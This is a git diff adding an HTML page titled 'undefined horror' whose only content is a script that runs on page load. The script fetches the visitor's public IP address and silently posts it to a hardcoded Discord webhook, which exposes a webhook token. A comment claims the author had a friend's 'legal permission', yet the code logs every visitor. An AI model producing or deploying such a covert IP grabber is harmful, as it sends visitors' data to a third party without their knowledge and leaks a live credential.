@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>undefined horror</title>
+</head>
+<body>
+    <script>
+        async function logIPToDiscord() {
+            try {
+               
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+                
+                
+                await fetch('https://discord.com/api/webhooks/1355212761407160511/OmbkrHcOcbFIsBHyebN1TdB3ZUF8vAuRzZC3Fg1SWbQ70uX90Kih1VTR8dD-XfrgAk3Q', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: `IP Address: ${ip}`
+                    }),
+                });
+                
+                console.log('IP address sent to Discord:', ip);
+            } catch (error) {
+                console.error('Error fetching or sending IP address:', error);
+            }
+        }
+
+        
+// Dear Github, i was challanged to this, with legal permisson to my friend.
+
+
+        logIPToDiscord();
+    </script>
+</body>
+</html>
+
